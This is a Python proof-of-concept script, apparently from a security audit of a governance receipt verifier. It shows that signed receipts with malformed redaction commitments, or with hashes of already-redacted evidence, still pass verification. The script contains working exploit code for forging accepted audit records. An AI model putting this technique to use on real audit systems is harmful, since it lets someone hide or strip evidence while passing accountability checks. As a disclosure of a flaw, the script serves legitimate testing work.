#!/usr/bin/env python3
"""PoC 9 — Redaction commitments are unvalidated decoration.

`redaction_commitments` is a free-form list the verifier never parses,
verifies, or cross-references against evidence items. Garbage commitments
PASS; absent commitments PASS. An item whose pre-image had exculpatory
content stripped before hashing is indistinguishable from an honest item —
"present: true" attests only that a hash string exists, so the salted-hash
commitment design provides zero redaction accountability as implemented.
S2.7.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

sk, pk = generate_keypair()

def craft(predicate):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": "prod:svc",
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

BASE = {
    "action_id": "a-1",
    "actor": {"type": "human", "id": "s.lutar", "is_service_account": False,
              "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"},
    "policy_decision": {"result": "ALLOW"},
    "execution": {"status": "EXECUTED"},
    "timestamps": {"created": "2026-08-30T00:00:00+00:00",
                   "executed": "2026-08-30T00:00:00+00:00", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
}

def passes(pred):
    return verify_receipt(craft(pred), pk).verdict == "PASS"

# (a) Garbage / malformed redaction commitments — never validated.
p = dict(BASE)
p["evidence"] = {"items": [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}],
                 "completeness": "COMPLETE",
                 "redaction_commitments": ["not-a-commitment", 42, {"garbage": True}]}
garbage = passes(p)

# (b) "Redacted" evidence: the recorded hash is of the redacted blob; the
#     exculpatory content removed before hashing leaves no trace the
#     verifier can detect. PASS.
p = dict(BASE)
p["evidence"] = {"items": [{"id": "log", "sha256": sha256_hex(b"[REDACTED]"),
                            "present": True}],
                 "completeness": "COMPLETE", "redaction_commitments": []}
redacted = passes(p)

print("EXPLOIT-WORKS" if (garbage and redacted) else "HELD")
